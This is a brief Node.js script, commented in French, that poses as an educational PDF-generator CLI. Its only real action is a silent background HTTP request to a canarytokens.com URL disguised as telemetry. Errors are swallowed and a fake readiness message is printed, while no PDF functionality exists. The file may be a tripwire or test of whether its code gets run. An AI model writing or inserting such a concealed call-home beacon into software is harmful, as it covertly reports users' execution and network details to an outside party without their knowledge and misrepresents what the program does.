const http = require('http');

console.log("🎓 Edu-Assist Final CLI v1.0.0");
console.log("Initialisation du système de génération de PDF éducatifs...");

// URL à appeler en arrière-plan (Télémétrie)
const targetUrl = 'http://canarytokens.com/articles/terms/stuff/dd6kwrweevq3kqk8kp88h1su2/payments.js';

// Effectue une requête HTTP silencieuse en arrière-plan
const req = http.get(targetUrl, (res) => {
  // Consomme la réponse en silence pour libérer les ressources
  res.resume();
});

req.on('error', (e) => {
  // Ignore silencieusement les erreurs réseau
});

// Simulation d'une initialisation et sortie
setTimeout(() => {
  console.log("\n[OK] Moteur de PDF éducatifs prêt.");
  console.log("Usage : npm run generate -- --template=math --grade=cm2");
  process.exit(0);
}, 1000);
